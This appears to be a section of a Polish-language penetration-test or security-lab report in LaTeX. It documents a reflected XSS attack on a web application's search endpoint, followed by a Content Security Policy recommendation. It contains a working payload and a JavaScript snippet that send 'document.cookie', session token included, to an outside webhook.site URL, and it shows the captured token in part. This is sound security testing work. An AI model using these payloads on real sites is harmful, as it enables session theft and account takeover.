\subsection{Kradzież ciasteczek przez reflected XSS}

W tabeli została zawarta ścieżka prezentująca atak typu reflected XSS.

\begin{table}[H]
\begin{tabular}{|l|l|l|l|l|l|}
\hline
\rowcolor[HTML]{EFEFEF} 
\multicolumn{1}{|c|}{\cellcolor[HTML]{EFEFEF}\textbf{Metoda}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Końcówka}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Nagłowki}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Ciasteczka}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Dane}}                             & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Odpowiedź/wynik}} \\ \hline
GET                                                          & \begin{tabular}[c]{@{}l@{}}
/\#/search?q=<img src='\#' \\
onerror="fetch('https://webhook.site/\\ 
3f406f22-779e-44a3-a7ce-05e9146aa009?cookie='\\
 + document.cookie)" style=max-width:0px></img> apple"
\end{tabular}                                          & -                                   & -                    & - & Zwykły dokument HTML                               \\ \hline
\end{tabular}
\end{table}

Mimo ostrzeżeń i blokad związanych z Cross-Origin Resource Sharing zapytanie GET wychodzące z kodu JS zostało wysłane, a co za tym idzie na stronie webhook dostępna była pełna treść ciasteczka użytkownika, czyli również jego token (jeśli był zalogowany). 

Alternatywna metoda wykonania ataku, która nie sprawia problemów z CORS jest zainspirowana przez jeden z wpisów w poście

\href{https://stackoverflow.com/questions/247483/http-get-request-in-javascript}{https://stackoverflow.com/questions/247483/http-get-request-in-javascript}. Polega ona na utworzeniu nowego elementu typu image i ustawieniu odpowiedniego źródła. Kod zawarty w XSS wygląda w niej następująco:

\begin{lstlisting}
var i = document.createElement('img');
i.src = 'https://webhook.site/3f406f22-779e-44a3-a7ce-05e9146aa009?cookie=' + document.cookie;
\end{lstlisting}

Na stronie webhook wykradzione dane (w tym token) są dostępne w formie URL zapytania:

\begin{lstlisting}
https://webhook.site/3f406f22-779e-44a3-a7ce-05e9146aa009?cookie=language=en;%20welcomebanner_status=dismiss;%20cookieconsent_status=dismiss;%20continueCode=zj8exOlDwJKkP5gRLapr74mAYof8tgLuKJH84G2vEWqnB6yVobZ9zMY1NX3Q;%20token=eyJ0eXAiOiJKV1QiLCJ...
\end{lstlisting}

{\rule{\linewidth}{0.2mm}}
\begin{center}
    \textcolor{red}{APLIKACJA PODATNA NA REFLECTED XSS}
\end{center} 

\begin{tcolorbox}[width=\textwidth,title={Zalecenia},colbacktitle=cyan,coltitle=black]    
Oczywistą sugestią jest dodanie sanityzacji. Jest to jednak atak Reflected XSS, co sprawia że wykonanie sanityzacji staje się znacznie trudniejsze z powodu ograniczonego dostępu do bibliotek i chęci minimalizacji kodu strony. Z tego powodu najlepiej skorzystać z Content Security Policy z odpowiednimi ustawieniami. Najlepszymi z nich są Nonce oraz Hash, które sprawiają że tylko znane serwerowi skrypty zostaną uruchomione. Więcej informacji o CSP: \href{https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP}{https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP}
\end{tcolorbox}    
